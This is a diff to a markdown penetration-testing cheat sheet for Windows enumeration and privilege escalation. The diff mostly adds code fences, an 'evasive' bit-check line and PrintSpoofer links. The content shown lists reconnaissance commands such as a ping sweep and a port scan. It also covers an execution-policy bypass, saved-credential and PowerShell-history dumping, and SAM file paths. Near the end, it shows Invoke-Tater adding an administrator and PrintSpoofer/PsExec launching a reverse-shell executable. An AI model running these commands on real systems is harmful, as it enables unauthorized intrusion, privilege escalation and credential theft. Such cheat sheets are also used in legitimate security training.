@@ -57,8 +57,10 @@ while(1) { cat index.html | nc -w1 -l -p 8080 }
 
 # General Enumeration:
 ```powershell
+whoami /priv 
 setspn -T medin -Q  */*        # extract all accounts in the SPN - service principle name - service and account mapping
 ver                            # get version
+echo %PROCESSOR_ARCHITECTURE%  # Evasive way of bit info
 tasklist /svc                  # list all services
 tasklist /m                    # list all processes and dlls
 systeminfo                     # list system information
@@ -69,20 +71,25 @@ wmic qfe list                  # LIST patch history!!!
 $PSVersionTable.PSVersion
 
 findstr /si string *.extension # find patterns from current directory and recursively
+```
+[Whoami /priv SeImpersonate Privileges](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
 
 # Driver Queries
+```powershell
 driverquery
 sc query windefend # requires NAME use get-ciminstance here for memory
 sc queryex type=service
 get-ciminstance -namespace root/securitycenter2 -classname antivirusproduct
-
+```
 # Hotfix levels
+```powershell
 get-hotfix
 get-hotfix | format-list | findstr InstalledOn
 get-hotfix | format-table hotfixid
 get-hotfix -ID  # specific information
-
+```
 # User and Admin Enumeration
+```powershell
 whoami /priv
 net user # "" insert user name if required with quotes 
 get-netuser | out-gridview
@@ -92,9 +99,10 @@ Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
 Get-LocalUser -Name "Administrator" | Select Name,SID
 # Logged in
 query user /server:$SERVER
-
+```
 
 # WMi-Obejcts
+```powershell
 Get-WmiObject win32_useraccount | Select name,sid
 gvmi win32_userprofile
 #Get Computer system information
@@ -112,42 +120,48 @@ Get-NetUsers -Domain
 get-netdomaincontroller
 
 cmdkey /list # Saved Creds!
-
+```
 # Software
+```powershell
 get-executionpolicy -list
 set-executionpolicy bypass -scope process # Change executionpolicy
 wmic product get name,version,vendor
 wmic service list brief
 wmic service list brief | findstr  "Running"
 sc qc <service>
-
+```
 # Network Enumeration
+```powershell
 Get-NetComputer -ping
 netstat -ano # -a displays all active connections, -n prevents name resolution, -o display the pid for each connection
 arp -a
 ipconfig /all                                    # check dns server
 1..15 | %(echo "10.10.10.$_"; ping -n 1 10.10.10.$_ | Select-String tt1)         # ip ping sweep 
 1..1024 | %(echo ((New-Object Net.Sockets.TcpCLient).Connect("10.10.10.10", $_)) "Open port on - $_" 2>$null # Port scan
-
+```
 # Important locations
+```powershell
 C:\Windows\System32\drivers\etc\hosts           DNS entries
 \System32\drivers\etc\networks                  Network Settings
 \System32\drivers\config\SAM
 \repair\Sam                                     THESE ARE BOTH BACK SAM files
-
+```
 # World Writable Files and Directories
+```powershell
 accesschk.exe -uwdqs "Users" "c:\*" /accepteula
 accesschk.exe -uwdqs "Authenticated Users" "c:\*" /accepteula
 accesschk.exe -uwdqs "Everyone" "c:\*" /accepteula
 accesschk.exe -uwqs "Users" * /accepteula
 accesschk.exe -uwqs "Authenticated Users" * /accepteula
 accesschk.exe -uwqs "Everyone" * /accepteula
-
+```
 # ConsoleHost history file:
+```powershell
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 (Get-PSReadlineOption).HistorySavePath
-
+```
 # Task related
+```powershell
 schtasks /query /fo LIST /v
 
 ```
@@ -439,3 +453,4 @@ Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
 C:\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe # triggered on ADMIN use
 C:\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i # in local service reverse shell run exploit
 ```
+[PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases)
